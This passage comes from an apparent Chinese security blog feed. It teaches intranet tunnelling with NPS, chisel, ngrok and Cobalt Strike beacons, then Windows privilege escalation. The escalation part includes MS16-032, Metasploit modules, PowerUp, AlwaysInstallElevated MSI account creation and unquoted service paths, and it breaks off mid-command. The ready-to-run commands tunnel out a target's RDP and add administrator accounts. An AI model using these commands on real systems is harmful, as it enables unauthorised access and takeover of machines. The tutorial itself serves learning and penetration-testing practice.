class="hljs-comment">#web界面管理账号</span><br>web_password=123     <span class="hljs-comment">#web界面管理密码</span><br>web_port = 8080      <span class="hljs-comment">#web管理端口，通过访问该端口可以访问NPS后台</span><br>web_ip=0.0.0.0<br>web_base_url=        <span class="hljs-comment">#web管理主路径,用于将web管理置于代理子路径后面</span><br>web_open_ssl=<span class="hljs-literal">false</span><br>web_cert_file=conf/server.pem<br>web_key_file=conf/server.key<br><span class="hljs-comment"># if web under proxy use sub path. like http://host/nps need this.</span><br><span class="hljs-comment">#web_base_url=/nps</span><br><br><span class="hljs-comment">#Web API unauthenticated IP address(the len of auth_crypt_key must be 16)</span><br><span class="hljs-comment">#Remove comments if needed</span><br><span class="hljs-comment">#auth_key=test       #web api密钥</span><br>auth_crypt_key =1234567812345678    <span class="hljs-comment">#获取服务端authKey时的aes加密密钥，16位</span><br><br><span class="hljs-comment">#allow_ports=9001-9009,10001,11000-12000</span><br><br><span class="hljs-comment">#Web management multi-user login</span><br>allow_user_login=<span class="hljs-literal">false</span><br>allow_user_register=<span class="hljs-literal">false</span><br>allow_user_change_username=<span class="hljs-literal">false</span><br><br><br><span class="hljs-comment">#extension</span><br>allow_flow_limit=<span class="hljs-literal">false</span><br>allow_rate_limit=<span class="hljs-literal">false</span><br>allow_tunnel_num_limit=<span class="hljs-literal">false</span><br>allow_local_proxy=<span class="hljs-literal">false</span><br>allow_connection_num_limit=<span class="hljs-literal">false</span><br>allow_multi_ip=<span class="hljs-literal">false</span><br>system_info_display=<span class="hljs-literal">false</span><br><br><span class="hljs-comment">#cache</span><br>http_cache=<span class="hljs-literal">false</span><br>http_cache_length=100<br><br><span class="hljs-comment">#get origin ip</span><br>http_add_origin_header=<span class="hljs-literal">false</span><br><br><span class="hljs-comment">#pprof debug options</span><br><span class="hljs-comment">#pprof_ip=0.0.0.0       #debug pprof 服务端IP</span><br><span class="hljs-comment">#pprof_port=9999        #debug pprof 端口</span><br><br><span class="hljs-comment">#client disconnect timeout</span><br>disconnect_timeout=60   <span class="hljs-comment">#客户端连接超时，单位 5s，默认值 60，即 300s = 5mins</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160229829.png" alt="image-20240107160229829"><br>运行即可：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160238500.png" alt="image-20240107160238500"><br>登录web界面   admin&#x2F;123<br>配置<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160247561.png" alt="image-20240107160247561"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160257667.png" alt="image-20240107160257667"><br>点击添加<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160306745.png" alt="image-20240107160306745"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160316184.png" alt="image-20240107160316184"><br>客户端配置文件：</p><p>友情提示:这里将配置文件写出来主要是为了让大家了解配置文件的内容，如果觉得配置文件太过繁琐，大多数情况下只需要关注server_addr、conn_type、和vkey这三个参数即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>server_addr=127.0.0.1:8024<br>conn_type=tcp<br>vkey=123<br>auto_reconnection=<span class="hljs-literal">true</span><br>max_conn=1000<br>flow_limit=1000<br>rate_limit=1000<br>basic_username=11<br>basic_password=3<br>web_username=user<br>web_password=1234<br>crypt=<span class="hljs-literal">true</span><br>compress=<span class="hljs-literal">true</span><br><span class="hljs-comment">#pprof_addr=0.0.0.0:9999</span><br>disconnect_timeout=60<br><br>[health_check_test1]<br>health_check_timeout=1<br>health_check_max_failed=3<br>health_check_interval=1<br>health_http_url=/<br>health_check_type=http<br>health_check_target=127.0.0.1:8083,127.0.0.1:8082<br><br>[health_check_test2]<br>health_check_timeout=1<br>health_check_max_failed=3<br>health_check_interval=1<br>health_check_type=tcp<br>health_check_target=127.0.0.1:8083,127.0.0.1:8082<br><br>[web]<br>host=c.o.com<br>target_addr=127.0.0.1:8083,127.0.0.1:8082<br><br>[tcp]<br>mode=tcp<br>target_addr=127.0.0.1:8080<br>server_port=10000<br><br>[socks5]<br>mode=socks5<br>server_port=19009<br>multi_account=multi_account.conf<br><br>[file]<br>mode=file<br>server_port=19008<br>local_path=/Users/liuhe/Downloads<br>strip_pre=/web/<br><br>[http]<br>mode=httpProxy<br>server_port=19004<br><br>[udp]<br>mode=udp<br>server_port=12253<br>target_addr=114.114.114.114:53<br><br>[ssh_secret]<br>mode=secret<br>password=ssh2<br>target_addr=123.206.77.88:22<br><br>[ssh_p2p]<br>mode=p2p<br>password=ssh3<br><br>[secret_ssh]<br>local_port=2001<br>password=ssh2<br><br>[p2p_ssh]<br>local_port=2002<br>password=ssh3<br>target_addr=123.206.77.88:22<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">server_addr   <span class="hljs-comment">#服务端ip/域名:port</span><br>conn_type       <span class="hljs-comment">#与服务端通信模式(tp或kcp)</span><br>vkey           <span class="hljs-comment">#服务端配置文件中的密钥</span><br></code></pre></td></tr></table></figure><p>配置好后直接运行即可  npc.exe<br>也可以不要配置文件运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>Windows：<br>    npc.exe -server=ip:8024 -vkey=P@ssword<br>Linux：<br>    ./npc -server=xx.xx.xx.xx:8024 -vkey=P@ssword<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160327050.png" alt="image-20240107160327050"><br>在线了<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160335909.png" alt="image-20240107160335909"></p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160346237.png" alt="image-20240107160346237"><br>通过内网地址连接到主机</p><p><strong>chisel</strong><br>项目地址：<a href="https://github.com/jpillora/chisel/releases/tag/v1.7.4">https://github.com/jpillora/chisel/releases/tag/v1.7.4</a></p><p>Chisel 可用来搭建内网隧道，类似于常用的 frp 和 nps 之类的工具。由于目前使用的人比较少，因此对于有些杀软还不能准确的识别出该工具。chisel 可以进行端口转发、反向端口转发以及 Socks 流量代理，使用 go 语言编写，支持多个平台使用，是进行内网穿透的一个鲜为人知的好工具</p><p>工具使用：<br>这个工具和其他工还有一点不同，就是没有服务器和客户端，只有一个可执行文件。可以通过执行这个文件，让其充当服务器端或者客户端</p><p>查看帮助信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看客户端帮助信息</span><br>chisel server -<span class="hljs-built_in">help</span><br>chisel client -<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><ul><li>端口转发<br>（1）正向连接<br>在目标机上开启服务监听：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 1234<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160401745.png" alt="image-20240107160401745">在攻击上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.215:1234 1111:127.0.0.1:3389<br></code></pre></td></tr></table></figure><p>意思是将目标机的3389端口转发到本地的1111端口上<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160410368.png" alt="image-20240107160410368"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160419402.png" alt="image-20240107160419402"><br>连上了。<br>（2)反向连接<br>在目标机中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.234:1234 R:1111:127.0.0.1:3389<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160601106.png" alt="image-20240107160601106"></p><p>在攻击机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 1234 --reverse<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160608394.png" alt="image-20240107160608394">在本地访问127.0.0.1就是访问的目标机的3389<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160619430.png" alt="image-20240107160619430"></p><ul><li>socks代理<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160630053.png" alt="image-20240107160630053"><br>（1)正向连接<br>在攻击上执行：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel client 192.168.43.215:12345 socks<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160637238.png" alt="image-20240107160637238">在跳板机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 12345<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160646554.png" alt="image-20240107160646554"></p><p>（2）反向连接<br>在攻击机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 12345 --reverse<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160657134.png" alt="image-20240107160657134">在跳板机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.234:12345 R:socks<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160711146.png" alt="image-20240107160711146"></p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160720246.png" alt="image-20240107160720246"><br>在攻击上访问内网主机：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160731325.png" alt="image-20240107160731325"></p><ul><li><p><strong>ngrok</strong><br>  ngrok 是一个反向代理，通过在公共端点和本地运行的 Web 服务器之间建立一个安全的通道，实现内网主机的服务可以暴露给外网。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放，所以ngrok可以很方便地协助服务端程序测试<br>  特点<br>  官方维护，一般较为稳定</p><p>  跨平台，闭源</p><p>  有流量记录和重发功能</p></li></ul><p>进入ngrok官网（<a href="https://ngrok.com/%EF%BC%89%EF%BC%8C%E6%B3%A8%E5%86%8Cngrok%E8%B4%A6%E5%8F%B7">https://ngrok.com/），注册ngrok账号</a><br>创建隧道，如下<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160740416.png" alt="image-20240107160740416"><br>将3389端口代理出来<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160749372.png" alt="image-20240107160749372"></p><p>下载客户端<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160756679.png" alt="image-20240107160756679"></p><p>在目标机上运行客户端<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160804874.png" alt="image-20240107160804874"><br>输入这里的id<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160812180.png" alt="image-20240107160812180"><br>成功<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160821638.png" alt="image-20240107160821638"></p><ul><li><p><strong>smb beacon上线</strong><br>官网介绍：SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送。<br>因为连接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效</p><p> <strong>这种Beacon要求具有SMB Beacon的主机必须接受端口445上的连接。</strong><br> 派生一个SMB Beacon方法：在Listner生成SMB Beacon&gt;目标主机&gt;右键&gt; spawn &gt;选中对应的Listener&gt;上线<br> 或在Beacon中使用命令spawn smb（smb为我的smb listener名字)<br> <img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160846690.png" alt="image-20240107160846690"></p></li></ul><p>使用插件，或自带端口扫描，扫描内网机器<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160854918.png" alt="image-20240107160854918"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160901991.png" alt="image-20240107160901991">转到视图，选择目标<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160910125.png" alt="image-20240107160910125">在之前我们要先抓一波密码</p><p>运行成功后外部可以看到∞∞这个字符，这就是派生的SMB Beacon。<br>当前是连接状态，你可以Beacon上用link <ip>命令链接它或者unlink <ip>命令断开它</ip></ip></p><ul><li><p><strong>中转listener(Reverse TCP Beacon)</strong><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160917615.png" alt="image-20240107160917615">然后和上面差不多</p></li><li><p><strong>tcp beacon正向</strong><br>SMB Beacon，TCP Beacon 与 Cobalt Strike 中派生 payload 的大多数动作相兼容。除了一些 要求显式 stager 的用户驱动的攻击（比如：Attacks → Packages 、 Attacks → Web Drive-by ）<br>生成listener<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160926387.png" alt="image-20240107160926387">在中转机器的Beacon里使用connect [ip address] [port]命令进行正向连接，即可上线<img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160937286.png" alt="image-20240107160937286"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网穿透</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网权限提升</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在windows中，权限大概分为四种，分别是User,Administrator,System,TrustedInstaller。<br>其中前三种是我们接触的最多的。</p><ul><li><strong>纵向提权</strong><br>低权限角色获得高权限角色的权限。</li><li><strong>横向提权</strong><br>获取同级别角色的权限。</li></ul><p>常见的提权方法有系统内核溢出提权，数据库提权，错误的系统配置提权，组策略首选项提权，WEB中间件漏洞提权，DLL劫持提权，溢出高权限令牌提权，第三方软件&#x2F;服务提权等。</p><h2 id="补丁信息"><a href="#补丁信息" class="headerlink" title="补丁信息"></a>补丁信息</h2><ul><li><strong>手动查看</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161209098.png" alt="image-20240107161209098"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic qfe get Caption,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure><p>列出已安装补丁<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161215899.png" alt="image-20240107161215899">如果目标机存在ms16-032(KB3139914)漏洞，不仅可以利用metasploit进行提权，还能够用invoke-ms16-032.ps1脚本进行提权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-module Invoke-MS16-032.ps1<br>Invoke-MS16-032 -Application cmd.exe -Commandline <span class="hljs-string">&quot;/c net user test2 123.com /add&quot;</span><br></code></pre></td></tr></table></figure><ul><li><strong>利用Metasploit发现缺失补丁</strong><br>利用 post&#x2F;windows&#x2F;gather&#x2F;enum_patches 模块<br>可以根据漏洞编号快速找出系统中缺少的补丁。<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161225855.png" alt="image-20240107161225855"><br>metasploit还内置了 local_exploit_suggester模块，这个模块用于快速识别系统中可能被利用的漏洞。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use post/multi/recon/local_exploit_suggester<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161234606.png" alt="image-20240107161234606"></p><ul><li><strong>Powershell中的Sherlock脚本</strong><br>用于快速查找可能用于本地提权的漏洞</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module .\Sherlock.ps1<br>Find-AllVulns<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161243584.png" alt="image-20240107161243584"></p><p>项目地址：<a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><ul><li><h6 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows Exploit Suggester"></a>Windows Exploit Suggester</h6><p>将systeminfo信息输出到txt文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo &gt; info.txt<br></code></pre></td></tr></table></figure><p>windows-exploit-suggester下载地址：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggeste">https://github.com/AonCyberLabs/Windows-Exploit-Suggeste</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./windows-exploit-suggester.py --update<br>pip install xlrd --upgrade<br>/windows-exploit-suggester.py -d BulletinSearch.xlsx -i info.txt<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240108110957700.png" alt="image-20240108110957700"></p></li></ul><h2 id="Windows操作系统配置错误利用分析及防范"><a href="#Windows操作系统配置错误利用分析及防范" class="headerlink" title="Windows操作系统配置错误利用分析及防范"></a>Windows操作系统配置错误利用分析及防范</h2><p>在Windows系统中，攻击者通常会通过系统内核溢出漏洞来提权，但如果碰到无法通过内核溢出漏洞提权所在服务器权限的情况，就会利用系统中的配置错误来提权，Windows操作系统的常见配置错误包括管理员凭据配置错误，服务配置错误，故意消弱的安全措施，用户权限过高等。</p><ul><li><strong>PowerUP下的实战利用</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module .\PowerUp.ps1<br>Invoke-AllChecks<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161251489.png" alt="image-20240107161251489"></p><ul><li><strong>Metasploit下的实战</strong><br>在metasploit中对应的模块是service_permissions，选择“AGGRESSIVE”选项，可以利用目标机器上每一个有缺陷的服务，该选项被禁用时，该模块在第一次提权成功后就会停止工作。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use windows/local/service_permissions<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161301568.png" alt="image-20240107161301568"></p><p>如果有成功利用的会自动反弹一个meterpreter(system权限)</p><ul><li><strong>注册表键 AlwayslnstallElevated</strong><br>注册表键AlwayslnstallElevated是一个策略设置项，Windows允许低权限用户以System权限运行安装文件。如果启用此策略选项，那么任何权限的用户都能以System来安装恶意的MSI文件。</li></ul><p>该漏洞产生的原因是用户开启了Windows Install特权安装功能。</p><p>利用powerup.ps1个Get-Registry AlwaysInstallElevated特权来检查注册表键是否被设置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module PowerUp.ps1<br>Get-RegistryAlwaysInstallElevated<br></code></pre></td></tr></table></figure><p>、<img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161310254.png" alt="image-20240107161310254">接下来，添加账号，运行Write-UserAddMSI模块，生成MSI文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Write-UserAddMSI<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161320295.png" alt="image-20240107161320295"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec /q  /i UserAdd.msi<br></code></pre></td></tr></table></figure><p>这时，以普通权限运行UserAdd.msi，就会添加一个管理员账户。</p><h2 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h2><p>如果一个服务调用的可执行文件没有正确处理所引用的完整路径名，这个漏洞就会被攻击者用来上传任意可执行文件。也就是说，如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就存在漏洞。<br>该漏洞存在有如下两种可能</p><ol><li>如果路径与服务有关，就任意创建一个服务或者编译Service模板</li><li>.如果路径与可执行文件有关，就任意创建一个可执行文件。</li></ol><ul><li><p><strong>Trusted Service Paths 漏洞产生的原因</strong><br>因为windows服务通常都是以System权限运行的，所有系统在解析服务所对应的文件路径中的空格时，也会以系统权限进行。<br>比如，有一个文件路径”C:\Program Files\Some Folder\Service.exe”,对于该路径中的每一个空格，Windows都会尝试寻找与空格前面的名字相匹配的程序。操作系统会对文件路径中空格所有可能情况进行尝试，直到找到能匹配的程序。<br>会尝试：<br>1.C:\Program.exe<br>2.C:\Program Files\Some.exe<br>3.C:\Program Files\Some Folder\Service.exe<br>因此，如果一个被“适当”命名的可执行程序被上传到受影响的目录中，服务一旦重启，该程序就会以System权限运行（大多数情况下）</p></li><li><p><strong>实战</strong><br>首先检查目标机器中是否存在该漏洞，使用wmic查询命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode | findstr /i <span class="hljs-string">&quot;Auto&quot;</span> | findstr /i /V <span class="hljs-string">&quot;C:\Windows\\&quot;</span> | findstr /i /V <span class="hljs-string">&quot;&quot;</span><span 